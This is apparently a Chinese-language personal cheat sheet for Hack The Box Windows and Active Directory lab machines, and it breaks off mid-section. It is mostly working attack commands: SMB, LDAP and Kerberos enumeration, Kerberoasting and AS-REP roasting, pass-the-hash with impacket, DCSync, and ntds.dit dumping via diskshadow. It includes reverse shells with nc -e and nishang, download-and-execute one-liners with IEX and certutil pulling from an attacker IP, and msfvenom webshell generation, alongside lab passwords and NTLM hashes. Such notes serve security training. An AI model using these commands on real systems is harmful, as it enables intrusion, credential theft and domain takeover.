# 53 DNS

```bash
nslookup active.htb 10.10.10.100
nslookup dc.active.htb 10.10.10.100
```

```bash
dig @10.10.10.192 blackfield.local
dig axfr @10.10.10.192 blackfield.local
```

```bash
└─# nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
;; communications error to 10.10.10.13#53: timed out
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

```bash
└─# dig axfr @10.10.10.13
```

子域名枚举

```bash
wfuzz -H 'HOST: FUZZ.cronos.htb' -u 'http://10.10.10.13' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 397,975
```



# 21 FTP

匿名登录后可以直接下载目录

```bash
wget -r -np -nH ftp://10.10.10.5/aspnet_client
```

注意登录 ftp 后看看目录，也许是 web 目录，也许可以文件上传

```
ftp> put cmd.aspx
```



# 139/445 SMB

```bash
smbmap -H 10.10.10.100
smbmap -H 10.10.10.192 -u null
smbmap -u '' -H 10.10.10.182
smbmap -u xxx  -H 10.10.10.103 
enum4linux -a 10.10.10.100
smbclient -N -L //apt
smbclient -N -L \\\\10.10.10.103
smbclient -N -L //10.10.10.182
smbclient -N //10.10.10.192/profiles$
smbclient \\\\dead:beef::b885:d62a:d679:573f\\backup
smbclient --user r.thompson //10.10.10.182/data rY4n5eva
crackmapexec smb 10.10.10.192
crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182
```

递归列出文件 ，`Replication` 为共享的目录

```bash
smbmap -H 10.10.10.100 -R Replication --depth 10
```

```bash
smbclient //10.10.10.100/Replication -U ""%""
```

```
smbmap -H dc01.timelapse.htb -u guest -R
```

骚操作，为了明确每个目录的权限，用循环加过滤整理

```bash
└─# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//10.10.10.103/${share}" -c dir; echo; done
```

已有 的 凭据 来使用 smb

```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18

smbclient -U audit2020 //10.10.10.192/forensic                                                               
Password for [WORKGROUP\audit2020]:
```

下载所有

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

挂载到本地

```bash
mount -t cifs //10.10.10.192/profiles$ /mnt
mount -t cifs "//10.10.10.103/Department Shares" /mnt
#取消挂载
umount /mnt/
```

查看配置策略：

```
crackmapexec smb --pass-pol  10.10.10.192
```





# 135/445 RPC

```bash
rpcclient 10.10.10.213 -p 135
rpcdump.py 10.10.10.213 > rpcdump.list
```

```bash
rpcclient -U "" -N 10.10.10.40     # 不会用命令 就 `rpcclient $> help`
```

```bash
python /usr/share/doc/python3-impacket/examples/rpcdump.py -p 135 10.10.10.4
```

```bash
# 已知凭据
└─# rpcclient -U htb.local/james 10.10.10.52
Password for [HTB.LOCAL\james]:
rpcclient $> enumdomusers
```

从 rpc 协议里的 DCOM 接口里找到一些 uuid：

```bash
rpcmap.py ncacn_ip_tcp:10.10.10.213[135] -brute-uuids -brute-opnums
# 这些 uuid 分别代表了不同的服务，再去搜索这些服务里有无可利用的信息
```



# 389 LDAP

利用查询 [How To Search LDAP using ldapsearch (With Examples) – devconnected](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/#Finding_all_objects_in_the_directory_tree)

```BASH
ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight'

ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people

#注意 svc-alfresco 用户是不进行身份验证的
ldapsearch -x -b "DC=htb,DC=local" -s sub -H ldap://10.10.10.161 | grep svc-alfresco  
```



# 110 POP

```bash
telnet 10.10.10.17 110
> USER orestis 
> PASS kHGuERB29DNiNE
> LIST
> RETR 1
> RETR 2
```



# 25 SMTP

枚举用户名

```bash
smtp-user-enum -M RCPT -U test_user.txt -t 10.10.10.77 -w 10
```

```bash
smtp-user-enum -M VRFY -U cewl.list -t 10.10.10.51
```



# 技巧



- `GetADUsers.py` ，得到一个用户的凭据时，可以根据它查找域内存在的用户

  ```bash
  GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 
  ```

  也可以尝试请求票据

  ```bash
  getTGT.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
  ```



- Kerberoasting

  ```bash
  #先用已知用户凭据得到服务
  GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
  #再申请得到 TGS 票据
  getST.py -spn active/CIFS:445 active.htb/SVC_TGS:GPPstillStandingStrong2k18
  #导入票据进内存
  export KRB5CCNAME=SVC_TGS.ccache
  #请求对应的spn服务得到服务票据，夹带了账号密码信息，如果是rc4加密时就可以破解
  GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
  #破解票据
  hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
  ```

  

- 横向

  smb：

  ```bash
  smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
  smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
  ```

  拿shell：

  ```bash
  psexec.py active.htb/administrator@10.10.10.100
  Password:  Ticketmaster1968
  ```

  ```bash
  #票据传递
  getTGT.py -dc-ip 10.10.10.100 active.htb/administrator:Ticketmaster1968 #申请票据
  export KRB5CCNAME=administrator.ccache  #导入内存
  
  psexec.py -k -no-pass -dc-ip 10.10.10.100 -target-ip 10.10.10.100 -service-name cifs active.htb/administrator@dc.active.htb cmd
  ```

  ```bash
  evil-winrm -i apt -u administrator -H '2b576acbe6bcfda7294d6bd18041b8fe'
  evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'
  evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
  ```
  
  ```bash
  psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local 
  
  wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
  
  dcomexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local 
  
  smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
  ```
  
  密码喷射
  
  ```bash
  crackmapexec smb htb.local -u user3.list -H hash.list
  crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce
  ```
  
  



- nmap 扫 ipv6

  ```bash
  echo 'dead:beef::b885:d62a:d679:573f apt' >> /etc/hosts
  nmap -6 -p- --min-rate 10000 -oN nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f
  
  nmap -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV -0 -oN nmap-tcpscripts-ipv6 dead:beef::b885:d62a:d679:573f
  ```

  

- 破解 zip

  ```bash
  zip2john backup.zip > backup.zip.hash
  john backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
  hashcat -m 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt --user
  ```

  

- 根据域身份验证机制，枚举域内存在用户名

  ```bash
  ./kerbrute_linux_amd64 userenum -d htb.local --dc apt user.list
  ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
  ```

  ```bash
  nmap -6 -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=user.list apt 
  ```

  

- `getTGT.py` 利用，写个循环，**验证用户名和hash匹配在一起**，能否生成 票据

  ```sh
  #!/bin/bash
  
  while IFS='' read -r LINE || [-n "${LINE}" ]
  do
        echo "----------------------"
        echo " Feed the Hash:${LINE}"
        /usr/share/doc/python3-impacket/examples/getTGT.py apt/henry.vinson@htb.local -hashes ${LINE}
        
  done < hash.list     
  ```

  监听本地文件生成

  ```bash
  watch "ls -ltr | tail -2"
  ```

  同理还有个工具  https://github.com/3gstudent/pyKerbrute

  ```bash
  python ADPwdSpray.py apt htb.local 'henry.vinson' ../userhash.list 
  [*] DomainControlerAddr: apt
  [*] DomainName:          HTB.LOCAL
  
  ...[SNIP]...
  [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
  ```

  

- 得到凭据后可尝试读取注册表

  ```bash
  reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU
  
  reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\Software
  
  reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\Software\\GiganticHostingManagementSystem
  ```

  还可以尝试读取域内 Hash

  ```bash
  secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
  secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
  ```
  
  可尝试winrm、可验证 smb
  
  ```bash
  crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
  crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
  ```



- 提权阶段，翻看windows重要文件列表

  ```http
  https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
  ```

  可留心 powershell 历史记录

  ```http
  https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
  ```

  ```
  $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```

  ```powershell
  *Evil-WinRM* PS C:\Users\legacyy\desktop> cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
  
  *Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
  ```

  

- Responder 配合提取破解 NTMLV1，详情见 APT 靶机   [GitHub - lgandx/Responder ](https://github.com/lgandx/Responder)

  靶机运行：

  ```
  .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.5\share\file.txt
  ```

  kali：

  ```
  challenge=1122334455667788
  ```

  ```
  python Responder.py -I tun0 --lm
  ```

  到 https://crack.sh/ 来破解







- windows 提权阶段，可用 [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 来枚举内核漏洞，`systeminfo` 命令

  ```bash
  python2 windows-exploit-suggester.py --update
  python2 -m pip install xlrd==1.2.0 -i https://pypi.tuna.tsinghua.edu.cn/simple
  python2 windows-exploit-suggester.py  --database 2023-09-10-mssb.xls --systeminfo systeminfo.txt
  ```

- 内核提权 时，查看网站 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md)   [LOLBAS (lolbas-project.github.io)](https://lolbas-project.github.io/)

  例子：`JuicyPotato` 的利用，`whoami /priv`

  靶机下载 `kali` 里的 `JuicyPotato.exe`

  ```
  certutil.exe -urlcache -split -f http://10.10.16.3:5555/JuicyPotato.exe JuicyPotato.exe
  certutil.exe -urlcache -split -f http://10.10.16.3:5555/nc64.exe nc64.exe
  ```

  靶机执行

  ```
  C:\inetpub\drupal-7.54\JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd 10.10.16.3 4444"
  ```

  kali 监听

  ```
  nc -lvnp 
  ```


- 一个 win 漏洞提权枚举 脚本 [Watson](https://github.com/rasta-mouse/Watson)

  可以在kali开启 smb 共享运行

  ```
  \\10.10.16.5\share\Watson.exe
  ```

  一个漏洞库 https://github.com/abatchy17/WindowsExploits

  例子：开启 smb 共享运行 [MS11-046](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe)

  ```
  \\10.10.16.5\share\MS11-046.exe
  ```


- 提权时也可 msf 枚举

  ```
  msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
  msf6 post(multi/recon/local_exploit_suggester) > set session 1
  session => 1
  msf6 post(multi/recon/local_exploit_suggester) > run
  ```


- 提权枚举脚本 

  [PEASS-ng/winPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

  https://github.com/rasta-mouse/Sherlock

  例子 `Sherlock` ：

  ```
  echo 'Find-AllVulns' >> Sherlock.ps1   # kali 执行
  IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.5/Sherlock.ps1')  # 靶机执行
  ```






- python2 安装 pip

  https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43)

  ```bash
  wget https://bootstrap.pypa.io/pip/2.7/get-pip.py   #下载pip
  python get-pip.py   #安装pip
  python -m pip -V    #查看安装pip的版本
  ```



- powershell 的 wget 命令

  ```powershell
  wget -Uri "https://bootstrap.pypa.io/pip/2.7/get-pip.py" -OutFile "get-pip.py" 
  ```

  

- 靶机从黑客服务器下载工具，除了 python 小型服务器外，还可以用 smb

  ```bash
  # kali 开启 smb 共享
  export PATH=/usr/share/doc/python3-impacket/examples:$PATH                                           
  smbserver.py share .
  ```

  ```
  # windows 靶机下载
  net use \\10.10.16.5\share
  copy \\10.10.16.5\share\Chimichurri.exe .
  ```

  

- restful 网站结构，可用字典查找网站路径，即 endpoint 信息

  ```bash
  /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
  ```

  

- 反弹 shell 新思路

  kali 下载 nc 后开启 smb 共享，并监听

  ```bash
  wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe   
  python smbserver.py share .
  nc -lvnp 443
  ```

  靶机 webshell 触发

  ```
  \\10.10.16.3\share\nc64.exe -e cmd 10.10.16.3 443
  ```


- 用 `nishang` ，增加最后一行到 Invoke-PowerShellTcp.ps1 里

  ```
  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 443
  ```

  开启简单 python http 服务，在webshell 里执行

  ```
  powershell iex(new-object net.webclient).downloadstring('http://10.10.16.5:1234/Invoke-PowerShellTcp.ps1')
  ```

  监听得到 shell



- hash-identifier 工具可识别 hash，可再配合 hashcat --help | grep xxx 来筛选利用



- windows 提升 shell 交互性

  用 `nishang` 的 `Invoke-PowerShellTcp.ps1` 里的，增加 以下内容

  <img src=".\图片\Snipaste_2023-08-31_16-31-56.png" alt="Snipaste_2023-08-31_16-31-56"  />

  再 kali 开启 web 服务，然后靶机访问触发

  <img src=".\图片\Snipaste_2023-08-31_16-30-22.png" alt="Snipaste_2023-08-31_16-30-22" style="zoom:80%;" />



- 端口转发  [Release v1.9.1 · jpillora/chisel · GitHub](https://github.com/jpillora/chisel/releases/tag/v1.9.1)

  这里的环境是 靶机里的 mysql 只能本地访问，我们把靶机的 3306 端口转发到 kali 的 3306 ，方便 udf 提权

  靶机下载

  ```
  certutil.exe -urlcache -split -f http://10.10.16.3:5555/chisel1.8.1.exe chisel1.8.1.exe
  ```

  kali执行

  ```bash
  └─# chisel server -p 9595 reverse
  ```

  靶机执行

  ```
  chisel1.8.1.exe client 10.10.16.3:9595 R:3306:localhost:3306
  ```

  

- udf 提权  配合远程smb执行文件

  <img src=".\图片\Snipaste_2023-08-31_17-35-07.png" alt="Snipaste_2023-08-31_17-35-07" style="zoom: 150%;" />

  ```bash
  └─# locate mysqludf                                                                                                                                           1 ?
  /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
  /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
  /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
  /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
  /usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_
  /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
  /usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_
  /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
  ```
  
  <img src=".\图片\Snipaste_2023-08-31_17-37-58.png" alt="Snipaste_2023-08-31_17-37-58" style="zoom:80%;" />



- kali 火狐浏览器不能访问 https，解决 [方案](https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express)



- smtp 110 枚举用户名

  ```bash
  smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.10.10.7
  ```

  

- 漏洞利用脚本看看使用说明，看看哪些参数我们可以修改的，哪些参数需要再次信息搜集到才能修改利用



- AS-REP Roast

  用文件名字典循环枚举

  ```bash
  for user in $(cat user_new.list); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
  ```

  ```bash
  for user in $(cat user.list); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.10.10.52 2>/dev/null | grep -F -e '[+]' -e '[-]'; done
  ```
  
  ```bash
  GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile user.list -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
  ```
  
  已知凭据
  
  ```bash
  GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
  ```
  
  破解
  
  ```bash
  hashcat -h | grep Kerberos
  hashcat -m 18200 svc.asrep.hash /usr/share/wordlists/rockyou.txt --force
  ```



- Bloodhound

  ```bash
  # kali 采集 靶机，需要凭据 
  bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
  # SharpHound 远程导入
  iex(new-object net.webclient).downloadstring("http://10.10.16.5/SharpHound.ps1")
  invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
  # 直接运行 exe
  ./SharpHound.exe
  ```




- rpc 重置用户密码（如果有权限）[Reset AD user password with Linux :: malicious.link — welcome (room362.com)](https://room362.com/post/2017/reset-ad-user-password-with-linux/)

  ```bash
  rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "zf1yolo!!!"'
  ```



- `lsass.DMP` 文件储存了内存中所有的账号密码（好像mimikatz抓密码就是与这个相关的），如果得到了就可以破解

  [pypykatz](https://github.com/skelsec/pypykatz)        [This blog](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) 

  ```
  pypykatz lsa minidump lsass.DMP
  ```

  

- 提权里 `whoami /priv` 中 [Backup Operators](https://www.backup4all.com/what-are-backup-operators-kb.html) 组的利用，`SeBackUpPrivilege` basically allows for full system read

  Copy-FileSeBackupPrivilege  利用：[This repo](https://github.com/giuliano108/SeBackupPrivilege) 

  尝试上传 `SeBackupPrivilegeCmdLets.dll` 与 `SeBackupPrivilegeUtils.dll`，upload 这样上传很可能失败，用 wget 下载

  ```powershell
  *Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeCmdLets.dll
  *Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeUtils.dll
  ```

  ```powershell
  wget -Uri http://10.10.16.5/SeBackupPrivilegeCmdLets.dll -OutFile ./SeBackupPrivilegeCmdLets.dll
  ```

  ```
  wget -Uri http://10.10.16.5/SeBackupPrivilegeUtils.dll -OutFile ./SeBackupPrivilegeUtils.dll
  ```

  然后导入

  ```powershell
  *Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
  *Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
  ```

  我们直接读取会失败，复制再读取会成功

  ```powershell
  *Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege C:\windows\system32\config\netlogon.dns netlogon.dns
  ```

  ```powershell
  *Evil-WinRM* PS C:\programdata> type netlogon.dns
  ```

  存在 windows 任意文件读取了



- 紧接上文， ntds.dit 是域内信息文件，如果能读的话导下来本地破解。但是需要很高的权限才能读，且一直被进程占用，相当于被锁住了无法下载下来，上文 [Backup Operators](https://www.backup4all.com/what-are-backup-operators-kb.html) 组 里绕过了权限问题，这里解决 DiskShadow 来绕过进程锁住的问题

  [good breakdown](https://pentestlab.blog/tag/diskshadow/)    [PentestLab blog](https://pentestlab.blog/tag/diskshadow/) 

  kali：

  ```bash
  └─# vim vss.dsh
  
  ┌──(root💀kali)-[~/Blackfield]
  └─# unix2dos vss.dsh
  unix2dos: converting file vss.dsh to DOS format...
                          
  ┌──(root💀kali)-[~/Blackfield]
  └─# cat vss.dsh
  set context persistent nowriters
  set metadata c:\programdata\df.cab
  set verbose on
  add volume c: alias df
  create
  expose %df% z:
  ```

  靶机：

  ```powershell
  *Evil-WinRM* PS C:\windows\system32> upload vss.dsh c:\programdata\vss.dsh
  *Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
  ```

  

- 靶机文件传回 kali，紧接上文，传回 ntds.dit

  kali 开启 smb 共享

  ```bash
  smbserver.py s . -smb2support -username zf1yolo -password zf1yolo
  ```

  靶机连接，传送 ntds.dit 文件，这个过程很慢很慢，配合 `Copy-FileSeBackupPrivilege`

  ```powershell
  net use \\10.10.16.5\s /u:zf1yolo zf1yolo
  Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.16.5\s\ntds.dit
  net use /d \\10.10.16.5\share
  ```




- 破解 ntds.dit ，紧接上文，还要得到 key。于是靶机把 key 传回到 kali（还是smb共享实现），再用脚本破解

  ```bash
  reg.exe save hklm\system \\10.10.16.5\s\system
  secretsdump.py -system system -ntds ntds.dit LOCAL > ntds.white
  ```

  ```bash
  cat ntds.white | grep Admin
  ```

  

- linux 私钥解密

  ```bash
  curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k -o id_rsa
  ```

  ```
  python /usr/share/john/ssh2john.py id_rsa   
  john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
  ```

  私钥权限 400

  ```bash
  chmod 400 id_rsa
  ssh -i id_rsa orestis@10.10.10.17
  ```

  

- LXD/LXC容器提权

  > LXD 是基于 LXC 容器技术实现的轻量级容器管理程序，而 LXC 是 Linux 系统自带的容器。提权原理与 Docker 提权非常相似，本质都是利用用户创建一个容器，在容器中挂载宿主机的磁盘后使用容器的权限操作宿主机磁盘修改敏感文件，比如`/etc/passwd`、`/root/.ssh/authorized_keys`、`/etc/sudoers`等，从而完成提权。

  ```bash
  orestis@brainfuck:~$ id
  uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
  ```

  ```http
  https://www.exploit-db.com/exploits/46978
  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
  https://www.hackingarticles.in/lxd-privilege-escalation/
  ```

  kali操作

  ```bash
  git clone  https://github.com/saghul/lxd-alpine-builder.git
  cd lxd-alpine-builder
  ./build-alpine
  ```

  靶机操作

  ```bash
  wget http://10.10.16.3:8888/alpine-v3.13-x86_64-20210218_0139.tar.gz
  ```

  ```bash
  lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
  ```

  ```bash
  lxc image list
  lxc init myimage ignite -c security.privileged=true
  lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
  lxc start ignite
  lxc exec ignite /bin/sh
  id
  ```

  

- 打开 `*.db` 文件时，可以用 kali 自带工具 sqlite3

  ```
  sqlite3 Audit.db
  ```
  
  

- `AD Recycle Bin` 組， gives a PowerShell command to query all of the deleted objects within a domain

  详情见 Cascade 靶机

  ```
  Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
  Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
  ```

  

- msf 生成 webshell

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=2233 -f aspx > met_rev_2233.aspx
  ```

  


- python网站注意 ssti 模板注入，可直接找 payload 

  ```http
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
  ```

  ```http
  https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
  ```


​        可以参考  [HTB: Doctor | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html#template-injection)



- 二次信息搜集时，注意到 web 日志，找重要信息

  ```bash
  web@doctor:/var/log$ grep -r passw . 2>/dev/null
  ```

  

-  writeDac 到域控 ， DCSync， [记一次靶场域场景之域渗透-NTLM中继攻击思路 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/306668.html)，可参考 Forest 靶机

  ```powershell
  # 远程导入 PowerView.ps1
  powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/PowerView.ps1')"
  # 或者本地导入
  . .\PowerView.ps1 
  ```

  ```powershell
  # writeDac 权限 把用户赋予 DCSync 权限 
  $pass = convertto-securestring 'zf1yolo' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('htb\zf1yolo', $pass)
  Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zf1yolo -Rights DCSync
  ```

  ```bash
  # 导出域内 hash
  secretsdump.py zf1yolo:zf1yolo@10.10.10.161
  ```



- kerbrute 爆破密码

  把用户名字典和密码字典整理成 `username:password` 的形式

  ```bash
  for each in $(cat user.list);do for i in $(cat password.list);do echo $each:$i >> user_pass.list;done;done
  ```

  ```bash
  ./kerbrute_linux_amd64 bruteforce --dc 10.10.10.193 -d fabricorp.local  user_pass.list
  ```

  

- hydra 爆破 smb

  ```bash
  hydra -L user.list -P password.list  10.10.10.193 smb
  ```



- smbpwd 修改密码

  ```bash
  └─# smbclient -U bhult -L \\\\10.10.10.193
  Password for [WORKGROUP\bhult]:  Fabricorp01
  session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
  ```

  这时候就得修改密码

  ```bash
  smbpasswd -r 10.10.10.193 bhult
  ```



- 对于一种情形，举个例子，比如已知一个用户的密码，但是这个密码提示要修改，而且过几分钟后又得修改。我们要根据这组凭据来收集更多的信息，比如 smb 、rpc、ldap 等等。这时候就得动态获取，写脚本自动化实现会方便些

  ```bash
  if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi;
  ```

  ```bash
  smbmap -H 10.10.10.193 -u bhult -p "$pass"
  rpcclient -U bhult%${pass} 10.10.10.193
  ```



- 打印机漏洞提权   [CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)



- WebDAV  查看 http 请求中允许哪些方法，如 put、copy等都是可以利用的

  ```bash
  curl -X OPTIONS http://10.10.10.15 -vv
  davtest -url http://10.10.10.15
  ```

  例子：put 结合 copy 的利用，生成木马传到web路径里再触发

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f asp -o shell.txt
  curl -X PUT --upload-file shell.txt http://10.10.10.15/shell.txt
  curl -X MOVE --header 'Destination:http://10.10.10.15/shell.asp' 'http://10.10.10.15/shell.txt'
  curl http://10.10.10.15/shell.asp
  ```



- `Jenkins` cms 的 getshell ，build project 或者 script console ，详情见 Jeeves 靶机  与 [HTB: Object | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/02/28/htb-object.html)



- CEH.kdbx 文件 为，That’s a [KeePass](https://keepass.info/) database, a local password manager，可爆破得到密码，然后查看

  ```bash
  keepass2john CEH.kdbx
  ```

  ```
  kpcli --kdb CEH.kdbx
  show -f 0
  show -f 1
  show -f 2
  ............
  ```

  


- windows 文件的特性，这里是查看 flag 文件的例子

  ```powershell
  dir /R
  
  11/08/2017  10:05 AM    <DIR>          .
  11/08/2017  10:05 AM    <DIR>          ..
  12/24/2017  03:51 AM                36 hm.txt
                                      34 hm.txt:root.txt:$DATA
  11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
                 2 File(s)            833 bytes
                 2 Dir(s)   2,674,114,560 bytes free
  
  c:\Users\Administrator\Desktop> more < hm.txt:root.txt                                                   
  afbc5bd4b615a60648cec41c6ac92530                                  
  ```

  

- msf 里的脚本不好利用时，可以找到对应的 CVE 编号，再全网搜 EXP

  ```bash
  └─# cat 16320.rb |grep CVE                                                                                                                                   1 ⨯
  					[ 'CVE', '2007-2447' ],
  					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
  ```



- 脚本解码 ASCII

  ```bash
